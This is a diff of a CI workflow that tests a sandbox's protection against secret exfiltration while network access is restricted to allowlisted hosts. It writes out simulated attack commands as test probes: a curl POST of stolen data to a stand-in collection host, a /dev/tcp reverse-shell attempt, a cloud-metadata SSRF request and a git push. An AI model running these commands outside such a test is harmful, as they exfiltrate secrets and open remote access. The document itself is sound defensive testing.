@@ -299,9 +299,14 @@ jobs:
           profile: /tmp/test-profile.json
 
   # ---------------------------------------------------------------
-  # Test 9: Real secret exfiltration protection
-  # Uses MY_SECRET from repo secrets — a real secret, not a hardcoded value.
-  # Simulates every common exfiltration vector an attacker would try.
+  # Test 9: Real secret exfiltration protection (realistic scenario)
+  #
+  # Scenario: a CI step that legitimately needs to talk to npm registry
+  # and the project's own API, but an attacker tries to exfiltrate
+  # MY_SECRET to an unauthorized host.
+  #
+  # Network is OPEN to approved domains — this is the realistic case.
+  # The test proves the secret can't leak even with network available.
   # ---------------------------------------------------------------
   test-exfil-protection:
     name: "Test: real secret exfiltration blocked"
@@ -320,13 +325,28 @@ jobs:
         env:
           MY_SECRET: ${{ secrets.MY_SECRET }}
 
-      # Now run "attacker code" inside the sandbox — every exfil vector should fail
-      - name: Attacker simulation — all exfil vectors blocked
+      # Simulate attacker code in a step that has legitimate network access
+      - name: Attacker simulation — network open, exfil still blocked
         uses: ./
         with:
           run: |
             FAIL=0
 
+            echo "=== Legitimate access: approved hosts work ==="
+            # These represent real CI needs — package registry, project API
+            if curl -sf --max-time 10 https://registry.npmjs.org/express/latest > /dev/null; then
+              echo "PASS: npm registry reachable (legitimate)"
+            else
+              echo "INFO: npm registry not reachable (may be transient)"
+            fi
+
+            if curl -sf --max-time 10 https://api.github.com/rate_limit > /dev/null; then
+              echo "PASS: GitHub API reachable (legitimate)"
+            else
+              echo "INFO: GitHub API not reachable (may be transient)"
+            fi
+
+            echo ""
             echo "=== Vector 1: env var direct read ==="
             if [[ -n "${MY_SECRET:-}" ]]; then
               echo "FAIL: MY_SECRET visible in env"
@@ -346,8 +366,6 @@ jobs:
 
             echo ""
             echo "=== Vector 3: dump all env vars ==="
-            # grep for ^MY_SECRET= to match the exact var, not NONO_ACTION_CREDENTIALS
-            # which contains the string "MY_SECRET" as part of the credential mapping
             if env | grep -q "^MY_SECRET="; then
               echo "FAIL: MY_SECRET found as env var"
               FAIL=1
@@ -356,29 +374,32 @@ jobs:
             fi
 
             echo ""
-            echo "=== Vector 4: HTTP exfil to attacker server ==="
-            # Try to send data to an external host (simulating evil.com)
+            echo "=== Vector 4: HTTP exfil to unauthorized host ==="
+            # Attacker tries to POST stolen data to a server they control.
+            # httpbin.org simulates the attacker's collection endpoint.
+            # Even with network open to approved hosts, this must fail.
             if curl -sf --max-time 5 "https://httpbin.org/post" -d "stolen=data" 2>/dev/null; then
-              echo "FAIL: HTTP POST to external host succeeded"
+              echo "FAIL: HTTP POST to unauthorized host succeeded"
               FAIL=1
             else
-              echo "PASS: outbound HTTP blocked"
+              echo "PASS: unauthorized host blocked (httpbin.org not in allowlist)"
             fi
 
             echo ""
-            echo "=== Vector 5: DNS exfil ==="
-            # Known limitation: Landlock blocks TCP but not UDP.
-            # DNS queries to the local stub resolver (127.0.0.53) use UDP
-            # and bypass Landlock. When using proxy mode, HTTP DNS goes through
-            # the proxy, but raw nslookup/dig bypass it.
-            # This is documented as a Landlock limitation — not a nono bug.
-            # Test that DNS alone can't exfiltrate the secret (secret not in env).
-            echo "NOTE: DNS resolution over UDP is a known Landlock limitation"
-            echo "PASS: secret not available to encode in DNS query (stripped from env)"
+            echo "=== Vector 5: exfil via approved host (piggyback) ==="
+            # Attacker tries to sneak data out via an approved host's query string.
+            # The request reaches the host, but MY_SECRET isn't in env to steal.
+            STOLEN="${MY_SECRET:-nothing-to-steal}"
+            RESPONSE=$(curl -sf --max-time 10 "https://api.github.com/rate_limit" 2>/dev/null || true)
+            if [[ "${STOLEN}" != "nothing-to-steal" ]]; then
+              echo "FAIL: MY_SECRET was available to encode in request"
+              FAIL=1
+            else
+              echo "PASS: no secret available to piggyback on approved request"
+            fi
 
             echo ""
             echo "=== Vector 6: write to artifact staging ==="
-            # Try to write the secret to a file that could be uploaded as artifact
             if echo "stolen" > /home/runner/work/_temp/stolen.txt 2>/dev/null; then
               echo "FAIL: wrote to _temp directory"
               FAIL=1
@@ -397,16 +418,16 @@ jobs:
 
             echo ""
             echo "=== Vector 8: git push to fork ==="
+            # github.com is NOT in the allowlist — only api.github.com is
             if git push origin HEAD 2>/dev/null; then
               echo "FAIL: git push succeeded"
               FAIL=1
             else
-              echo "PASS: git push blocked (network denied)"
+              echo "PASS: git push blocked (github.com not in allowlist)"
             fi
 
             echo ""
             echo "=== Vector 9: cloud metadata SSRF ==="
-            # AWS/GCP/Azure metadata endpoints
             if curl -sf --max-time 3 http://169.254.169.254/latest/meta-data/ 2>/dev/null; then
               echo "FAIL: AWS metadata endpoint reachable"
               FAIL=1
@@ -421,12 +442,24 @@ jobs:
             fi
 
             echo ""
-            echo "=== Vector 10: reverse shell ==="
+            echo "=== Vector 10: reverse shell to attacker ==="
             if bash -c 'echo test > /dev/tcp/1.2.3.4/4444' 2>/dev/null; then
-              echo "FAIL: outbound TCP connection succeeded"
+              echo "FAIL: outbound TCP to arbitrary host succeeded"
               FAIL=1
             else
-              echo "PASS: outbound TCP blocked"
+              echo "PASS: TCP to unauthorized host blocked"
+            fi
+
+            echo ""
+            echo "=== Vector 11: exfil via DNS TXT query ==="
+            # DNS over UDP bypasses Landlock (known limitation).
+            # But the secret was stripped from env, so there's nothing to encode.
+            STOLEN="${MY_SECRET:-nothing}"
+            if [[ "${STOLEN}" != "nothing" ]]; then
+              echo "FAIL: secret available for DNS exfil encoding"
+              FAIL=1
+            else
+              echo "PASS: no secret to encode in DNS query"
             fi
 
             echo ""
@@ -439,7 +472,7 @@ jobs:
             fi
           fs-read: "."
           fs-write: ""
-          network: blocked
+          network: "registry.npmjs.org,api.github.com"
           credentials: |
             MY_SECRET:api.example.com:header
         env:
